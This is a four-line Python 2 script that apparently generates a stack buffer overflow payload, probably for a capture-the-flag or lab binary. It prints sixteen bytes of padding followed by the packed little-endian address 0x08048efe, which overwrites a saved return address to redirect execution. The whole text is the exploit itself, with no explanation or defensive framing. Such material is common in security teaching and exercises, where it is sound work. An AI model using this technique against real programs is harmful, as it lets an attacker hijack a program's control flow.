from struct import pack 
target_addr = 0x08048efe

print "\x00" * (12+4) + pack ('<I' , target_addr) 
